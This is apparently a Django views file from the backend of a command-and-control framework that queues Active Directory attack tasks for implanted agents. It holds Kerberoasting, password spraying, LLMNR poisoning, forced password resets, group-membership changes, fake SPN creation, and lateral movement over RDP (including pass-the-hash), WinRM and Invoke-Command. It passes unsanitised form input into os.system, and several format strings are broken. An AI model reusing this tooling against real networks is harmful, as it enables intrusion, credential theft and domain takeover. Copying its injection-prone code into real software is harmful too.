        password = request.POST['password'] #optional
        aeskey = request.POST['hexkey']     #optional
        hashes= request.POST['hashes']      #optional
        agent = request.POST['agent']
        result_dir= current_path+"/../../data/listeners/agents/{}/".format(agent)
        result_path = result_dir+"results"
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        current_user = request.user
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
        agentTask.save()
        if username != '':
            os.system("echo '===============TGS Tickets===============\nOutPut in the following path:\n{result_dir}' >> {result_path};python ../general/GetUserSPNs.py -dc-ip {DCip} {domain}/{username}:{password} -o {result_dir}TGStickets -request".format(result_dir,result_path,username,password,domain,DCip))
        else:
            if hashes != '':
                os.system("echo '===============TGS Tickets===============\nOutPut in the following path:\n{result_dir}' >> {result_path};python ../general/GetUserSPNs.py -dc-ip {DCip} {domain} -hashes {hashes} -o {result_dir}TGStickets -request".format(result_dir,result_path,hashes,domain,DCip))

            else:
                os.system("echo '===============TGS Tickets===============\nOutPut in the following path:\n{result_dir}' >> {result_path};python ../general/GetUserSPNs.py -dc-ip {DCip} {domain} -aeskey {aeskey} -o {result_dir}TGStickets -request".format(result_dir,result_path,aeskey, domain,DCip))
    
        return JsonResponse({},status=200)

    else:
        return render(request, 'blog/listeners.html')

def TGStickets_powerview(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        current_user = request.user
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
        agentTask.save()
        task= 'echo "++++++++++++++++++`r`n`t`r`n===============TGStickets===============\nOutPut in the following path:\n$env:userprofile";import-module $env:userprofile\powerview.ps1;Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\$env:userprofile\[$env:username]TGS.csv -NoTypeInformation;echo "++++++++++++++++++`r`n"'
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)

    else:
        return render(request, 'blog/listeners.html')


#powerview    
def test_localAdmin(request, agent='', compName='', user='', password='', domain=''):
    if request.method=='POST':
        os.system("timeout 30 python3 -m http.server --directory {} 8888".format(tools_path))
        if user == '':
            task= 'echo "++++++++++++++++++`r`n`t`r`n===============Test-AdminAccess===============";import-module $env:USERPROFILE\powerview.ps1;Test-AdminAccess -ComputerName {};echo "++++++++++++++++++`r`n"'.format(compName)    
            task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
            with open(task_path, "w") as f:
                f.write(task)
                f.close()
        else:
            task= 'echo "++++++++++++++++++`r`n`t`r`n===============Test-AdminAccess===============";import-module $env:USERPROFILE\powerview.ps1;$SecPassword = ConvertTo-SecureString "{password}" -AsPlainText -ForceGet-DomainTrustMapping;$Cred =New-Object System.Management.Automation.PSCredential("{domain}\{user}", $SecPassword);Test-AdminAccess -ComputerName {compName} -Credential $Cred;echo "++++++++++++++++++`r`n"'.format(password,domain,user,compName)    
            task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
            with open(task_path, "w") as f:
                f.write(task)
                f.close()
    else:
        return render(request, 'blog/listeners.html')

#enum
def usercommand_history(request):
    if request.method=='POST':
        user = request.POST['user']
        agent = request.POST['agent']
        if user=='':  #user field is optional
            task= 'echo "++++++++++++++++++`r`n`t`r`n===============Specified user history===============";Get-Content $env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt;echo "++++++++++++++++++`r`n"' 
        else:
            task= 'echo "++++++++++++++++++`r`n`t`r`n===============Specified user history===============";Get-Content C:/users\{}\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt;echo "++++++++++++++++++`r`n"'.format(user)      
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
    else:
        return render(request, 'blog/listeners.html')


#enum
# kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_users
def UserEnumwithKerbrute(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        current_user = request.user
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
        agentTask.save()
        users_list = request.POST['users_list']
        dc_ip = request.POST['dc_ip']
        domain = request.POST['domain']
        result_dir= current_path+"/../../data/listeners/agents/{}/".format(agent)
        result_path = result_dir+"results"
        os.system("echo '===============kerbrute O/P===============\nOutPut in the following path:\n{result_dir}' >> {result_path};./../general/kerbrute_linux_386 userenum -d {domain} --dc {dc_ip} {users_list} | cut -d ':' -f 4 | sed 's/ //g' >> {result_dir}KerpUserEnum ".format(domain,dc_ip,users_list,result_path))
    else:
        return render(request, 'blog/listeners.html')

#enum
def GPO_windapsearch(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        current_user = request.user
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
        agentTask.save()
        DCip = request.POST['DCip']
        username = request.POST['username']
        password = request.POST['password']
        result_path = current_path+"/../../data/listeners/agents/{}/results".format(agent)
        os.system("echo '===============GPO_windapsearch===============' >> {result_path};python  ../general/windapsearch/windapsearch.py --dc-ip {ip} -u {username} -p {password} --gpos >> {result_path}  ;".format(DCip,username,password,result_path))
        return JsonResponse({},status=200)
    else:
        return render(request, 'blog/listeners.html')


# def pass_spray(request, agent='', password=''):
#     if request.method=='POST':
#         task= 'echo "++++++++++++++++++`r`n`t`r`n===============Password Spraying===============\nOutPut in the following path:\n$env:USERPROFILE";import-module $env:USERPROFILE\DomainPasswordSpray.ps1;Invoke-DomainPasswordSpray -Password {} -OutFile $env:USERPROFILE\spray_success -ErrorAction SilentlyContinue -Force'.format(password)
#         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
#         with open(task_path, "w") as f:
#             f.write(task)
#             f.close()
#     else:
#         return render(request, 'blog/listeners.html')        

def CME_pass_spray(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        current_user = request.user
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
        agentTask.save()
        DCip = request.POST['DCip']
        userslist = request.POST['userslist']
        password = request.POST['password']
        result_path = current_path+"/../../data/listeners/agents/{}/results".format(agent)
        os.system("echo '===============Password Spraying===============' >> {result_path};crackmapexec smb {DCip} -u {userslist} -p {password} | grep + >> {result_path};".format(DCip,userslist,password,result_path))
        return JsonResponse({},status=200)
    else:
        return render(request, 'blog/listeners.html')


####Need a look to the OutPut-Dir
def llmnr_poison(request, agent='', time=0):
    if request.method=='POST':
        os.system("timeout 30 python3 -m http.server --directory {} 8888".format(tools_path))
        task= 'echo "++++++++++++++++++`r`n`t`r`n===============Inveigh starting===============";import-module $env:USERPROFILE\inveigh.ps1;Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y -RunTime {};echo "++++++++++++++++++`r`n"'.format(time)
        #####then send the inveigh logs ($env:USERPROFILE\Inveigh-*) files to our machine
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
    else:
        return render(request, 'blog/listeners.html')

def pass_policy(request, agent=''):
    if request.method=='POST':
        task= 'echo "++++++++++++++++++`r`n`t`r`n===============Password Policy===============";net accounts /DOMAIN;echo "++++++++++++++++++`r`n"'
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
    else:
        return render(request, 'blog/listeners.html')


def set_execPolicy(request, agent='',policy='',scope=''):
    if request.method=='POST':
        task= 'echo "++++++++++++++++++`r`n`t`r`n===============Set-ExecutionPolicy===============";Set-ExecutionPolicy {} -Scope {};echo "++++++++++++++++++`r`n"'.format(policy,scope)       
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()

    else:
        return render(request, 'blog/listeners.html')

def snaffler(request, agent='', domain=''):
    if request.method=='POST':
        task= 'echo "++++++++++++++++++`r`n`t`r`n===============Snaffler===============\nOutPut in the following path:\n$env:USERPROFILE";$env:USERPROFILE\Snaffler.exe -d {} -o snaffler.log -v data;echo "++++++++++++++++++`r`n"'.format(domain)       
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
#### we need to get snaffler.log on our machine
    else:
        return render(request, 'blog/listeners.html')


def InterestingACL_Enum(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        current_user = request.user
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
        agentTask.save()
        os.system("timeout 30 python3 -m http.server --directory {} 8888".format(tools_path))
        task= 'echo "++++++++++++++++++`r`n`t`r`n===============Find-InterestingDomainAcl===============";import-module $env:userprofile\powerview.ps1;Find-InterestingDomainAcl;echo "++++++++++++++++++`r`n"'
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)

    else:
        return render(request, 'blog/listeners.html')


##Working on it
def SpecificACL_Enum_powerview(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        current_user = request.user
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
        agentTask.save()
        user = request.POST['user']
        os.system("timeout 30 python3 -m http.server --directory {} 8888".format(tools_path))
        task= 'echo "++++++++++++++++++`r`n`t`r`n===============ACLs Enum===============";import-module $env:userprofile\powerview.ps1;$sid = Convert-NameToSid {user};Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid};echo "++++++++++++++++++`r`n"'.format(user)
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)

    else:
        return render(request, 'blog/listeners.html')

def ReverseSearch_and_Mapping_GUID(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        current_user = request.user
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
        agentTask.save()
        guid = request.POST['guid']
        os.system("timeout 30 python3 -m http.server --directory {} 8888".format(tools_path))
        task= 'echo "++++++++++++++++++`r`n`t`r`n===============Reverse Search & Mapping to a GUID Value===============";import-module $env:userprofile\Microsoft.ActiveDirectory.Management.dll;$guid="{}";Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like \'ControlAccessRight\'} -Properties * |Select Name,DisplayName,DistinguishedName,rightsGuid| ?{$_.rightsGuid -eq $guid}|fl;echo "++++++++++++++++++`r`n"'.format(guid)
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)

    else:
        return render(request, 'blog/listeners.html')


def NestedGroups_of_a_Group(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        current_user = request.user
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
        agentTask.save()
        groupname = request.POST['groupname']
        os.system("timeout 30 python3 -m http.server --directory {} 8888".format(tools_path))
        task= 'echo "++++++++++++++++++`r`n`t`r`n===============NestedGroups_of_a_Group===============";import-module $env:userprofile\powerview.ps1;Get-DomainGroup -Identity "{}" | select memberof;echo "++++++++++++++++++`r`n"'.format(groupname)
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)

    else:
        return render(request, 'blog/listeners.html')

def forceChangePass_DomainUserPassword(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        current_user = request.user
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
        agentTask.save()
        contoleduser = request.POST['contoleduser']
        password = request.POST['password']
        wanteduser = request.POST['wanteduser']
        wantedpassword = request.POST['wantedpassword']
        os.system("timeout 30 python3 -m http.server --directory {} 8888".format(tools_path))
        task= 'echo "++++++++++++++++++`r`n`t`r`n===============Force Change Password===============";import-module $env:userprofile\powerview.ps1;$firstPassword =ConvertTo-SecureString \'{password}\' -AsPlainText -Force;$Cred =New-Object System.Management.Automation.PSCredential(\'INLANEFREIGHT\{contoleduser}\',$firstPassword);$secondPassword =ConvertTo-SecureString \'{wantedpassword}\' -AsPlainText -Force;Set-DomainUserPassword -Identity {wanteduser} -AccountPassword $secondPassword -Credential $Cred -Verbose;echo "++++++++++++++++++`r`n"'.format(password,contoleduser,wantedpassword,wanteduser)
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)

    else:
        return render(request, 'blog/listeners.html')

def AddGroupMember(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        current_user = request.user
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
        agentTask.save()
        user = request.POST['user']
        password = request.POST['password']
        group = request.POST['group']
        os.system("timeout 30 python3 -m http.server --directory {} 8888".format(tools_path))
        task= 'echo "++++++++++++++++++`r`n`t`r`n===============Add Member to Group===============";import-module $env:userprofile\powerview.ps1;$secPassword =ConvertTo-SecureString \'{password}\' -AsPlainText -Force;$Cred =New-Object System.Management.Automation.PSCredential(\'INLANEFREIGHT\{user}\', $secPassword);Add-DomainGroupMember -Identity \'{group}\' -Members \'{user}\' -Credential $Cred -Verbose;echo "++++++++++++++++++`r`n"'.format(password,user,group)
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)

    else:
        return render(request, 'blog/listeners.html')

def RmGroupMember(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        current_user = request.user
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
        agentTask.save()
        user = request.POST['user']
        password = request.POST['password']
        group = request.POST['group']
        os.system("timeout 30 python3 -m http.server --directory {} 8888".format(tools_path))
        task= 'echo "++++++++++++++++++`r`n`t`r`n===============Remove Group Member===============";import-module $env:userprofile\powerview.ps1;$secPassword =ConvertTo-SecureString \'{password}\' -AsPlainText -Force;$Cred =New-Object System.Management.Automation.PSCredential(\'INLANEFREIGHT\{user}\', $secPassword);Remove-DomainGroupMember -Identity "{group}" -Members "{user}" -Credential $Cred -Verbose;echo "++++++++++++++++++`r`n"'.format(password,user,group)
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)

    else:
        return render(request, 'blog/listeners.html')

def CreateFake_SPN(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        current_user = request.user
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
        agentTask.save()
        user = request.POST['user']
        password = request.POST['password']
        os.system("timeout 30 python3 -m http.server --directory {} 8888".format(tools_path))
        task= 'echo "++++++++++++++++++`r`n`t`r`n===============Createing Fake SPN===============";import-module $env:userprofile\powerview.ps1;$secPassword =ConvertTo-SecureString \'{password}\' -AsPlainText -Force;$Cred =New-Object System.Management.Automation.PSCredential(\'INLANEFREIGHT\{user}\', $secPassword);Set-DomainObject -Credential $Cred -Identity {user} -SET @{serviceprincipalname="notahacker/LEGIT"} -Verbose;echo "++++++++++++++++++`r`n"'.format(password,user)
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)

    else:
        return render(request, 'blog/listeners.html')


def UserGeneralInfo(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        current_user = request.user
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
        agentTask.save()
        user = request.POST['user']
        os.system("timeout 30 python3 -m http.server --directory {} 8888".format(tools_path))
        task= 'echo "++++++++++++++++++`r`n`t`r`n===============Createing Fake SPN===============";import-module $env:userprofile\powerview.ps1;Get-DomainUser -Identity {user} ;echo "++++++++++++++++++`r`n"'.format(user)
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)

    else:
        return render(request, 'blog/listeners.html')


#Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"


def Enum_GroupMembers_on_machine(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        current_user = request.user
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
        agentTask.save()
        groupName = request.POST['groupName']
        computerName = request.POST['computerName']
        os.system("timeout 30 python3 -m http.server --directory {} 8888".format(tools_path))
        task= 'echo "++++++++++++++++++`r`n`t`r`n===============Createing Fake SPN===============";import-module $env:userprofile\powerview.ps1;Get-NetLocalGroupMember -ComputerName {} -GroupName "{}";echo "++++++++++++++++++`r`n"'.format(computerName,groupName)
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)

    else:
        return render(request, 'blog/listeners.html')


def LateralMov_RDP(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        current_user = request.user
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
        agentTask.save()
        domain = request.POST['domain']
        ip = request.POST['ip']
        username = request.POST['username']
        password = request.POST['password']   ## optional
        PassTheHash = request.POST['PassTheHash']  ##optional
        result_dir= current_path+"/../../data/listeners/agents/{}/".format(agent)
        result_path = result_dir+"results"
        os.system("echo '===============Lateral Movement via RDP===============' >> {};".format(result_path))

        if password != "":
            os.system("xfreerdp /d:{1} /u:{2} /p:{3} /v:{4};".format(result_path,domain,username,password,ip))
        elif PassTheHash != "":
            os.system("xfreerdp /d:{0} /u:{1} /pth:{2} /v:{3};".format(domain,username,PassTheHash,ip))

        return JsonResponse({},status=200)
    else:
        return render(request, 'blog/listeners.html')    


def LateralMov_WinRM(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        current_user = request.user
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
        agentTask.save()
        username = request.POST['username']
        password = request.POST['password']
        domain = request.POST['domain']
        computername = request.POST['computername']
        task= 'echo "++++++++++++++++++`r`n`t`r`n===============Lateral Movement via WinRm (Enter-PSSesion)===============";$password=ConvertTo-SecureString \'{}\' -Asplaintext -force;$creds2=New-Object System.Management.Automation.PSCredential("{}\{}", $password);Enter-PSSession -ComputerName {} -credential $creds2;echo "++++++++++++++++++`r`n"'.format(password,domain,username,computername)
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)

    else:
        return render(request, 'blog/listeners.html')


def LateralMov_InvokeCommand(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        current_user = request.user
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
        agentTask.save()
        username = request.POST['username']
        password = request.POST['password']
        domain = request.POST['domain']
        command = request.POST['command']
        task= 'echo "++++++++++++++++++`r`n`t`r`n===============Lateral Movement via InvokeCommand===============";$password=ConvertTo-SecureString \'{}\' -Asplaintext -force;$creds2=New-Object System.Management.Automation.PSCredential("{}\{}", $password);Invoke-Command -ComputerName lab-dc-01 -Credential $creds2 -ScriptBlock {powershell -ep bypass /c "{}"};echo "++++++++++++++++++`r`n"'.format(password,domain,username,command)
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)

    else:
        return render(request, 'blog/listeners.html')

def gpp_autologin(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        current_user = request.user
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
        agentTask.save()
        ip = request.POST['ip']
        username = request.POST['username']
        password = request.POST['password']   ## optional
        result_dir= current_path+"/../../data/listeners/agents/{}/".format(agent)
        result_path = result_dir+"results"
        os.system("echo '===============gpp_autologin===============' >> {0}; crackmapexec smb {1} -u {2} -p {3} -M gpp_autologin >>{0}".format(result_path, ip,username,password))

        return JsonResponse({},status=200)
    else:
        return render(request, 'blog/listeners.html')  